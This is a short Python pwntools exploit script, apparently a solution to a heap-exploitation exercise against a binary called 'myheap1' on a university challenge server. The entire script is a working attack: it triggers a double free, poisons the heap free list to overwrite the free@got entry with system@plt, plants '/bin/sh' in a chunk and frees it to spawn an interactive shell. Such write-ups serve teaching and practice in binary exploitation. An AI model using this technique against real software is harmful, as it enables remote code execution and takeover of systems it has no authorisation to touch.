from pwn import *

def get_process():
    if args.REMOTE:
        return remote("lettieri.iet.unipi.it", 4461)
    else:
        return remote("localhost", 4461)
    

elf = ELF('./myheap1')
context.binary = elf
libc = ELF('./libc.so.6')
# Gather info
free_got = elf.got['free']
log.info(f"free@got: {hex(free_got)}")
system_plt = elf.plt['system']
log.info(f"system@plt: {hex(system_plt)}")

p = get_process()
# Create two chunks
p.sendline(b'aA' + b'A' * 8) # idx 0
p.sendline(b'dA') # delete idx 0
p.sendline(b'dA') # delete idx 0 double free
p.sendline(b'aB' + p64(free_got - 16))
p.sendline(b'aC' + b'/bin/sh\x00')
p.sendline(b'aD' + p64(system_plt)) # overwrite free@got with system@plt
p.sendline(b'dC') # trigger system("/bin/sh")
p.interactive()